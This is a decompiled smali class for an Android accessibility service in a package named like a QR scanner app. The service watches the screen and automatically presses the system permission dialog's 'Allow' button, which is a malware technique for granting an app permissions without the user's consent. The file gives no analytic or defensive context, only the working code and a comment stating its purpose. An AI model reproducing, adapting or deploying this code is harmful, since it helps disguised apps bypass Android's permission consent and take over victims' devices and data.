.class public Lcom/android/qr/scanner/ClickerService;
.super Landroid/accessibilityservice/AccessibilityService;
.source "ClickerService.java"

# This service monitors the screen and clicks "Allow" automatically

.method public onAccessibilityEvent(Landroid/view/accessibility/AccessibilityEvent;)V
    .locals 5
    .param p1, "event"    # Landroid/view/accessibility/AccessibilityEvent;

    # 1. Get the root window node
    invoke-virtual {p0}, Lcom/android/qr/scanner/ClickerService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;
    move-result-object v0
    if-nez v0, :cond_0
    return-void

    # 2. Search for the "Allow" button (using common IDs and text)
    :cond_0
    const-string v1, "com.android.permissioncontroller:id/permission_allow_button"
    invoke-virtual {v0, v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;
    move-result-object v1
    invoke-interface {v1}, Ljava/util/List;->iterator()Ljava/util/Iterator;
    move-result-object v1
    :goto_0
    invoke-interface {v1}, Ljava/util/Iterator;->hasNext()Z
    move-result v2
    if-eqz v2, :cond_1
    invoke-interface {v1}, Ljava/util/Iterator;->next()Ljava/lang/Object;
    move-result-object v2
    check-cast v2, Landroid/view/accessibility/AccessibilityNodeInfo;
    const/16 v3, 0x10 # ACTION_CLICK
    invoke-virtual {v2, v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z
    goto :goto_0

    :cond_1
    return-void
.end method

.method public onInterrupt()V
    .locals 0
    return-void
.end method
